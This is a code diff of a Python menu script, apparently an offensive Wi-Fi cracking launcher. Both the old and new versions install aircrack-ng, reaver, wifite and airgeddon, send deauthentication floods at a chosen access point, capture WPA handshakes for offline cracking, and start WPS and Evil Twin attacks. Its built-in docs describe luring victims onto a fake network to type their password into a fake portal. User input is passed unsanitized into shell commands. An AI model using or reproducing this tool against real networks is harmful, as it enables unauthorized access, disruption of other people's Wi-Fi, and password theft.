@@ -4,188 +4,131 @@ import sys
 import time
 import subprocess
 
-# --- UI CONSTANTS ---
-GREEN = "\033[1;32m"
-BLUE = "\033[1;34m"
-RED = "\033[1;31m"
-YELLOW = "\033[1;33m"
-RESET = "\033[0m"
-
-# --- SYSTEM SETTINGS ---
-VERSION = "2.0.1-STABLE"
-CODENAME = "WIFI-CRACK-OS"
+# --- STYLING (Standard CLI) ---
+# No fancy themes, just standard terminal colors
+G = "\033[32m" # Green
+R = "\033[31m" # Red
+Y = "\033[33m" # Yellow
+B = "\033[34m" # Blue
+W = "\033[0m"  # White/Reset
 
 def header():
     os.system("clear")
-    print(f"""{GREEN}
- ██████╗ ███████╗    ██████╗ ███████╗██████╗ ██╗  ██╗
-██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║ ██╔╝
-██║   ██║███████╗    ██║  ██║█████╗  ██████╔╝█████╔╝ 
-██║   ██║╚════██║    ██║  ██║██╔══╝  ██╔══██╗██╔═██╗ 
-╚██████╔╝███████║    ██████╔╝███████╗██║  ██║██║  ██╗
- ╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
- {BLUE}>> SYSTEM CORE: {CODENAME} | VERSION: {VERSION} <<
- {YELLOW}>> DEVELOPER: BlackHatHacker-Ankit <<{RESET}""")
+    print(f"""{G}
+    __      __ _  ______  _      _____   _____ 
+    \ \    / /(_)|  ____|| |    / ____| / ____|
+     \ \  / /  _ | |__   | |   | |     | |     
+      \ \/ /  | ||  __|  | |   | |     | |     
+       \  /   | || |     | |__ | |____ | |____ 
+        \/    |_||_|     |____| \_____| \_____|
+    {B}>> WIFI-CORE SECURITY OS [Version 2.1]{W}""")
 
-
-
-def run_command(command):
-    """Run a shell command and stream output live."""
-    process = subprocess.Popen(
-        command,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True
-    )
-
-    for line in process.stdout:
-        print(line, end="")
-
-    process.wait()
-    return process.returncode
-
+def progress_bar(current, total, pkg_name):
+    width = 40
+    progress = int(width * current / total)
+    bar = "█" * progress + "-" * (width - progress)
+    sys.stdout.write(f"\r{Y}[INSTALLING]{W} |{bar}| {current}/{total} {pkg_name}   ")
+    sys.stdout.flush()
 
 def install_system():
     header()
-    print(f"\n{YELLOW}[!] INITIALIZING SYSTEM INSTALLATION...{RESET}")
-
-    packages = [
-        "aircrack-ng", "crunch", "xterm", "wordlists", "reaver",
-        "pixiewps", "bully", "wifite", "airgeddon", "dnsmasq",
-        "hostapd", "lighttpd", "php-cgi"
-    ]
-
-    # Update package list first (recommended)
-    print(f"{BLUE}[*] Updating package list...{RESET}")
-    if run_command(["sudo", "apt-get", "update"]) != 0:
-        print(f"{RED}[!] Failed to update package list.{RESET}")
-        return
-
-    for pkg in packages:
-        print(f"\n{BLUE}[*] Installing {pkg}...{RESET}")
-        result = run_command(["sudo", "apt-get", "install", "-y", pkg])
-        if result != 0:
-            print(f"{RED}[!] Failed to install {pkg}{RESET}")
-        else:
-            print(f"{GREEN}[+] {pkg} installed successfully.{RESET}")
-
-    # Handle Rockyou
-    rockyou_path = "/usr/share/wordlists/rockyou.txt"
-    if not os.path.exists(rockyou_path):
-        print(f"\n{YELLOW}[*] Extracting rockyou wordlist...{RESET}")
-        run_command(["sudo", "gzip", "-d", "/usr/share/wordlists/rockyou.txt.gz"])
-
-    print(f"\n{GREEN}[+] SYSTEM READY. Press Enter to boot.{RESET}")
-    input()
-
-
-def get_tool_info(choice):
-    info = {
-        "1": {
-            "name": "Monitor Mode",
-            "tools": "airmon-ng",
-            "workflow": "Puts your Wi-Fi card into 'listening' mode. Essential for seeing packets you aren't normally supposed to see.",
-            "impact": "Disconnects you from your current Wi-Fi internet."
-        },
-        "4": {
-            "name": "Handshake Capture",
-            "tools": "airodump-ng / aireplay-ng",
-            "workflow": "1. Scan for targets -> 2. Target specific BSSID -> 3. Send Deauth packets to force a reconnect -> 4. Capture the encrypted 4-way handshake.",
-            "impact": "Kicks target users off their Wi-Fi for 2-5 seconds."
-        },
-        "5": {
-            "name": "Evil Twin / Captive Portal",
-            "tools": "airgeddon / hostapd / dnsmasq",
-            "workflow": "1. Create fake AP with same name -> 2. Deauth real AP -> 3. Victim joins fake AP -> 4. Victim is shown a fake login page -> 5. Victim types password -> 6. Script verifies password.",
-            "impact": "High. Steals password via social engineering."
-        }
+    print(f"\n{B}[*] INITIALIZING REPOSITORY CHECK...{W}\n")
+    
+    # Tool Mapping: Package Name -> Affected Menu Options
+    packages = {
+        "aircrack-ng": ["1", "2", "4", "7"],
+        "xterm": ["4", "5"],
+        "reaver": ["3"],
+        "pixiewps": ["3"],
+        "bully": ["3"],
+        "wifite": ["2"],
+        "airgeddon": ["5"],
+        "hostapd": ["5"],
+        "dnsmasq": ["5"]
     }
-    return info.get(choice, None)
+    
+    failed_tools = []
+    total = len(packages)
+    
+    for i, (pkg, options) in enumerate(packages.items(), 1):
+        progress_bar(i, total, pkg)
+        
+        # Run install and hide output
+        result = subprocess.run(["sudo", "apt-get", "install", "-y", pkg], 
+                                capture_output=True, text=True)
+        
+        if result.returncode != 0:
+            failed_tools.append((pkg, options))
+            
+    print("\n") # Break the progress bar line
+    
+    if failed_tools:
+        print(f"{R}[!] INSTALLATION COMPLETED WITH ERRORS{W}")
+        print("-" * 50)
+        for pkg, opts in failed_tools:
+            print(f"{R}FAILED:{W} {pkg.ljust(15)} {Y}DEGRADED OPTIONS:{W} {', '.join(opts)}")
+        print("-" * 50)
+        print(f"{Y}[NOTE]{W} Re-run Option 8 after checking your internet connection.")
+    else:
+        print(f"{G}[+] SYSTEM FULLY OPERATIONAL.{W}")
+    
+    input(f"\nPress Enter to return to terminal...")
+
+def get_docs():
+    header()
+    print(f"{B}--- SYSTEM WORKFLOW DOCUMENTATION ---{W}")
+    print(f"\n{G}OPTION 4: HANDSHAKE CAPTURE (The Deauther){W}")
+    print(f"   - {B}Tool:{W} airodump-ng & aireplay-ng")
+    print(f"   - {B}Workflow:{W} Kicks users off their Wi-Fi. When they reconnect, we grab")
+    print(f"     the encrypted password 'handshake' file for offline cracking.")
+    
+    print(f"\n{G}OPTION 5: EVIL TWIN (The Social Engineer){W}")
+    print(f"   - {B}Tool:{W} Airgeddon (hostapd + dnsmasq)")
+    print(f"   - {B}Workflow:{W} Creates a fake Wi-Fi network. Users connect, thinking it's")
+    print(f"     their router. They enter the password into a fake portal page.")
+    
+    input(f"\n{Y}Press Enter to return...{W}")
 
 def main_menu():
     header()
     print(f"""
-{BLUE}OS MODULES:{RESET}
-(1)  Monitor Mode (Start/Stop)      (6)  Wordlist Generator (Crunch)
-(2)  Network Scanner (Airodump)     (7)  Offline Cracker (Aircrack)
-(3)  WPS Attack (Pixie Dust)        (8)  System Update/Install
-(4)  Handshake Capturer             (9)  Tool Documentation & Workflow
-(5)  EVIL TWIN (Captive Portal)     (00) Shutdown System
------------------------------------------------------------------------""")
+ {G}(1){W} Monitor Mode       {G}(5){W} EVIL TWIN (Captive Portal)
+ {G}(2){W} Scan Networks      {G}(6){W} Crack Handshake
+ {G}(3){W} WPS Attack         {G}(7){W} Tool Docs & Workflow
+ {G}(4){W} Capture Handshake  {G}(8){W} Repair/Install System
+ 
+ {R}(00){W} Shutdown
+-------------------------------------------------------""")
     
-    choice = input(f"{GREEN}┌──({RED}root@{CODENAME}{GREEN})─[{BLUE}~{GREEN}]\n└─$ {RESET}").strip()
+    cmd = input(f"{G}wifi-os{W}@{B}root{W}:~$ ").strip()
 
-    if choice == "1":
-        mode = input("1. Start Monitor | 2. Stop Monitor: ")
-        if mode == "1":
-            interface = input("Interface (wlan0): ")
-            os.system(f"sudo airmon-ng start {interface} && sudo airmon-ng check kill")
-        else:
-            interface = input("Interface (wlan0mon): ")
-            os.system(f"sudo airmon-ng stop {interface} && sudo service network-manager restart")
-        main_menu()
-
-    elif choice == "2":
-        interface = input("Interface: ")
-        print(f"{YELLOW}[!] Press CTRL+C to stop scanning...{RESET}")
-        time.sleep(2)
-        os.system(f"sudo airodump-ng {interface}")
-        main_menu()
-
-    elif choice == "4":
-        interface = input("Interface: ")
-        bssid = input("Target BSSID: ")
-        channel = input("Target Channel: ")
-        out = input("Save file name: ")
-        print(f"{RED}[!] Opening Deauth window and Capture window...{RESET}")
-        # Opens two xterms: one to capture, one to deauth
-        os.system(f"xterm -e 'airodump-ng -c {channel} --bssid {bssid} -w {out} {interface}' &")
-        os.system(f"xterm -e 'aireplay-ng -0 20 -a {bssid} {interface}' &")
-        main_menu()
-
-    elif choice == "5":
-        print(f"{YELLOW}[*] Loading Airgeddon Core...{RESET}")
-        time.sleep(1)
-        os.system("sudo airgeddon")
-        main_menu()
-
-    elif choice == "8":
+    if cmd == "8":
         install_system()
         main_menu()
-
-    elif choice == "9":
-        header()
-        print(f"{BLUE}--- SYSTEM DOCUMENTATION ---{RESET}")
-        item = input("Enter option number to see details (1, 4, 5): ")
-        data = get_tool_info(item)
-        if data:
-            print(f"\n{GREEN}NAME: {data['name']}")
-            print(f"{YELLOW}TOOLS USED: {data['tools']}")
-            print(f"{BLUE}WORKFLOW: {data['workflow']}{RESET}")
-        else:
-            print(f"{RED}No documentation for this module.{RESET}")
-        input("\nPress Enter...")
+    elif cmd == "7":
+        get_docs()
         main_menu()
-
-    elif choice == "00":
-        print(f"{RED}Shutting down core...{RESET}")
+    elif cmd == "4":
+        # Handshake logic
+        interface = input("Interface: ")
+        bssid = input("Target BSSID: ")
+        chan = input("Channel: ")
+        os.system(f"xterm -hold -e 'airodump-ng -c {chan} --bssid {bssid} {interface}' &")
+        os.system(f"xterm -hold -e 'aireplay-ng -0 15 -a {bssid} {interface}' &")
+        main_menu()
+    elif cmd == "5":
+        os.system("sudo airgeddon")
+        main_menu()
+    elif cmd == "00":
+        print("Closing System...")
         sys.exit()
-
     else:
-        print(f"{RED}Command not recognized.{RESET}")
+        print(f"{R}Invalid Command.{W}")
         time.sleep(1)
         main_menu()
 
 if __name__ == "__main__":
     if os.getuid() != 0:
-        print(f"{RED}[!] ERROR: Access Denied. Run as sudo.{RESET}")
+        print("\033[31m[!] ERROR: This OS requires root privileges. Try: sudo python3 script.py\033[0m")
         sys.exit()
-    
-    # Prompt for installation on first run
-    header()
-    init = input(f"{YELLOW}[?] Perform system install/update first? (y/n): {RESET}")
-    if init.lower() == 'y':
-        install_system()
-    
-
     main_menu()
